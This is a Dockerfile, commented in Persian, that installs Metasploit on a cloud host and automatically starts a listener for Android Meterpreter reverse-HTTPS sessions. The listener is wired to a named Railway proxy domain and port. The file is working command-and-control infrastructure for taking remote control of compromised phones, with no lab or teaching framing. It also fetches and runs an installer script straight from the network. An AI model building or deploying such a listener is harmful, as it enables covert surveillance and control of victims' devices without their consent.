FROM ubuntu:22.04

# نصب dependencies پایه (curl و gnupg2 برای installer)
RUN apt update && apt install -y curl gnupg2 postgresql

# دانلود و ران کردن installer رسمی Metasploit omnibus (این روش بهترینه برای Docker)
RUN curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
    chmod +x msfinstall && \
    ./msfinstall

# ابتدایی کردن دیتابیس msfdb (لازم برای handlerها)
RUN /opt/metasploit-framework/bin/msfdb init

# پورت داخلی اپ (از RAILWAY_TCP_APPLICATION_PORT استفاده می‌کنه که 443ه)
EXPOSE ${RAILWAY_TCP_APPLICATION_PORT:-443}

# ران کردن msfconsole با handler اتوماتیک برای reverse_https
# LHOST رو به proxy domain می‌ذاره (shinkansen.proxy.rlwy.net)
# LPORT رو به proxy port می‌ذاره (58458)
CMD service postgresql start && /opt/metasploit-framework/bin/msfconsole -x "use multi/handler; set payload android/meterpreter/reverse_https; set LHOST $RAILWAY_TCP_PROXY_DOMAIN; set LPORT $RAILWAY_TCP_PROXY_PORT; set LURI /; set ExitOnSession false; exploit -j -z"
